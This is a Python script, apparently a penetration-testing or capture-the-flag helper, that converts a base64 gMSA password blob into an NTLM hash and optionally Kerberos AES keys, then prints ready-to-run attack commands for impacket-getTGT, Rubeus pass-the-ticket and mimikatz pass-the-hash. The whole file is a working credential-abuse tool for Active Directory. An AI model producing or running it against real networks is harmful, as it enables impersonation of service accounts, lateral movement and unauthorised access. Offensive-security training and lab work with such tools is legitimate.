#!/usr/bin/env python3
import base64, hashlib

try:
    from impacket.krb5.crypto import _AES256CTS, _AES128CTS
    IMPACKET_AVAILABLE = True
except ImportError:
    IMPACKET_AVAILABLE = False

print('\033[92m')
print('  ██████╗ ███╗   ███╗███████╗ █████╗     ██████╗ ███████╗ ██████╗ ██████╗ ██████╗ ███████╗██████╗ ')
print('  ██╔════╝████╗ ████║██╔════╝██╔══██╗    ██╔══██╗██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔══██╗')
print('  ██║  ███╗██╔████╔██║███████╗███████║    ██║  ██║█████╗  ██║     ██║   ██║██║  ██║█████╗  ██████╔╝')
print('  ██║   ██║██║╚██╔╝██║╚════██║██╔══██║    ██║  ██║██╔══╝  ██║     ██║   ██║██║  ██║██╔══╝  ██╔══██╗')
print('  ╚██████╔╝██║ ╚═╝ ██║███████║██║  ██║    ██████╔╝███████╗╚██████╗╚██████╔╝██████╔╝███████╗██║  ██║')
print('  ╚═════╝ ╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝    ╚═════╝ ╚══════╝ ╚═════╝ ╚═════╝ ╚═════╝╚══════╝╚═╝  ╚═╝')
print('\033[0m')
print()

blob = input("\033[92m==> Insert the gMSA blob to decode please: \033[0m")
try:
    data = base64.b64decode(blob, validate=True)
except Exception:
    print("\033[91m[-] Error: invalid base64 blob\033[0m")
    exit(1)

ntlm = hashlib.new('md4', data).hexdigest()
print(f"\033[92m==> Here's the NTLM hash: \033[94m{ntlm}\033[0m")

if IMPACKET_AVAILABLE:
    print()
    print("\033[92m==> AES key derivation (optional — needed if RC4 is blocked)\033[0m")
    print("\033[93m    Format salt: REALM.TLDhost<samaccountname_without_$_lowercase>.<fqdn_lowercase>\033[0m")
    print("\033[93m    Example: PONG.HTBhostpong_gmsa.pong.htb\033[0m")
    salt_input = input("\033[92m==> Enter Kerberos salt (leave empty to skip): \033[0m").strip()
    if salt_input:
        try:
            pwd = data.decode('utf-16-le', 'replace').encode('utf-8')
            salt = salt_input.encode('utf-8')
            aes256 = _AES256CTS.string_to_key(pwd, salt, b'\x00\x00\x10\x00').contents.hex()
            aes128 = _AES128CTS.string_to_key(pwd, salt, b'\x00\x00\x08\x00').contents.hex()
            print(f"\033[92m==> AES256: \033[94m{aes256}\033[0m")
            print(f"\033[92m==> AES128: \033[94m{aes128}\033[0m")
            print()
            print('\033[92m[*] Get TGT with AES256 (RC4 blocked):\033[0m')
            print(f'\033[94m    impacket-getTGT <domain>/<gmsa_account>$ -aesKey {aes256} -dc-ip <dc_ip>\033[0m')
        except Exception as e:
            print(f"\033[91m[-] AES derivation failed: {e}\033[0m")
else:
    print("\033[93m[!] impacket not found — AES key derivation unavailable\033[0m")

print()
print('\033[92m[*] Use the NTLM hash with Rubeus:\033[0m')
print(f'\033[94m    .\\Rubeus.exe asktgt /user:<gmsa_account> /rc4:{ntlm} /domain:<domain> /ptt\033[0m')
print()
print('\033[92m[*] PTH with mimikatz:\033[0m')
print(f'\033[94m    sekurlsa::pth /user:<gmsa_account> /rc4:{ntlm} /domain:<domain>\033[0m')
